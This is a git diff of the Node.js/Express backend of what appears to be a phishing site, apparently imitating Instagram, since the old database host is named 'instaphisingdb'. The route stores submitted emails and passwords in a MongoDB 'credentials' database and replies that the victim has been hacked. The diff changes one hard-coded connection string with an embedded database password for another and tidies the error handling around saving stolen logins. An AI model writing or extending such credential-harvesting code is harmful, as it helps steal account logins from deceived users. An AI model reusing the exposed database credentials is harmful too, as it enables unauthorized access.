@@ -6,7 +6,7 @@ const mongoose = require('mongoose')
 const path = require('path');
 
 try{
-    mongoose.connect('mongodb+srv://oisik:gsq0sW5F2AxhHpw0@instaphisingdb.cnehaew.mongodb.net/credentials?retryWrites=true&w=majority')
+    mongoose.connect('mongodb+srv://oisik:oisik@cluster1.itdrfyl.mongodb.net/credentialsDB?retryWrites=true&w=majority')
     console.log("connectionn successfull")
 }catch(err){
     console.log(err.message)
@@ -33,20 +33,22 @@ app.post('/', async function(req,res){
         return res.status(400).json({msg:false})
     }
 
-    try{
      const user = await model.create({
-        email:email,
-        password:password
-    })
+        email,
+        password
+    }).catch(err=>{return res.status(500).json(err.message)} )
 
-    await user.save()
 
+    try{
+        await user.save()
     }catch(err){
-        return res.json(err.message)
+        return res.status(500).json({msg:'something went wrong while saving the document'})
     }
+    
 
 
-   res.status(200).json({
+
+   return res.status(200).json({
     msg:'you have beeen hacked !',
     whoHackedYou:"oisik "
 })
